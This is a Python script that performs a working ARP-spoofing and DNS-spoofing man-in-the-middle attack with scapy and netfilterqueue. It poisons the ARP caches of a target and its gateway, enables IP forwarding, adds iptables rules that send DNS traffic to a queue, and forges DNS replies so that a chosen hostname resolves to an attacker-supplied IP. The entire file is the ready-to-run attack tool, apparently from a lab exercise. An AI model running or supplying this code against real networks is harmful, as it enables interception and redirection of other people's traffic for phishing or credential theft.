import time
from scapy.all import *
from typing import List
import os
import sys
import threading
import argparse
from netfilterqueue import NetfilterQueue


def get_attacker_mac(interface):
    try:
        return get_if_hwaddr(interface)
    except:
        return None


def get_mac_from_ip(ip_address: str):
    # dst="ff:ff:ff:ff:ff:ff" broadcasts the request to the whole network
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff")
        / ARP(pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff"),
        timeout=2,
        verbose=0,
    )
    if ans:
        return ans.hwsrc
    else:
        return None


def resolve_ip(name: str, ip_address: str):
    print(f"Resolving MAC address for {name} {ip_address}")

    # Resolve the target's MAC address
    mac = get_mac_from_ip(ip_address)

    if mac == None:
        print(f"Unable to resolve IP address. Exiting!")
        sys.exit(0)

    print(f"Resolved to {mac}")
    return mac


def arp_spoof(
    interface: str, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str
):
    # Build the packets
    target_packet = Ether(dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
    )
    router_packet = Ether(dst=gateway_mac) / ARP(
        op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
    )
    while True:
        sendp([target_packet, router_packet], verbose=0, iface=interface)
        # Sleep for 1 second between beacons
        time.sleep(1)


def dns_spoof(
    interface: str,
    hostnames: List[str],
    redirect_ip: str,
    attacker_mac: str,
    target_ip: str,
    target_mac: str,
):
    def dns_spoof(packet):
        # Convert the raw payload into a scapy packet
        data = packet.get_payload()
        scapy_packet = IP(data)
        # Skip the packet if it doesn't have a DNS query response
        if not scapy_packet.haslayer(DNSQR):
            packet.accept()
            return

        # Skip the packet if doesn't have our target hostnames
        qname = scapy_packet.qd.qname.decode()
        if qname not in hostnames:
            packet.accept()
            return

        print(f"Got query for {qname}")

        response_packet = (
            IP(src=scapy_packet[IP].dst, dst=scapy_packet[IP].src)
            / UDP(sport=scapy_packet[UDP].dport, dport=scapy_packet[UDP].sport)
            / DNS(
                qr=1,  # Response
                aa=1,  # Authoritative response
                id=scapy_packet[DNS].id,  # Copying the DNS id from the query
                qd=scapy_packet[DNS].qd,  # Copying the
                an=DNSRR(
                    ttl=10,  # Time To Live of the packet
                    rdata=redirect_ip,  # What IP to direct to
                    rrname=qname,  # The original hostname of the query
                ),
            )
        )
        packet.set_payload(bytes(response_packet))
        packet.accept()

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, dns_spoof)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        print("cleaning up")
        nfqueue.unbind()


def main(target_ip: str, gateway_ip: str, interface: str, dns_ip: str):
    # Resolve the MAC addresses
    target_mac = resolve_ip("target", target_ip)
    gateway_mac = resolve_ip("gateway", gateway_ip)
    attacker_mac = get_attacker_mac(interface)

    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system(
        f"iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1 -i {interface}"
    )
    os.system(f"iptables -A FORWARD -o {interface} -j ACCEPT")
    os.system(
        f"iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i {interface} -j ACCEPT"
    )

    # Loop forever and beacon packets
    try:
        arp_spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(interface, target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        )
        dns_spoof_thread = threading.Thread(
            target=dns_spoof,
            args=(
                interface,
                ["padraig.io."],
                dns_ip,
                attacker_mac,
                target_ip,
                target_mac,
            ),
            daemon=True,
        )
        arp_spoof_thread.start()
        dns_spoof_thread.start()
        arp_spoof_thread.join()
        dns_spoof_thread.join()
    except KeyboardInterrupt:
        os.system("sysctl -w net.ipv4.ip_forward=0")
        os.system("iptables -F")
        os.system("iptables -X")
        os.system("iptables -t nat -F")
        os.system("iptables -t nat -X")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    parser.add_argument(
        "-i",
        "--interface",
        dest="interface",
        help="Name of network interface",
        default="enp0s8",
    )
    parser.add_argument("-d", "--dns-redirect", dest="dns_ip", help="DNS Redirect IP")
    args = parser.parse_args()
    main(args.target, args.gateway, args.interface, args.dns_ip)
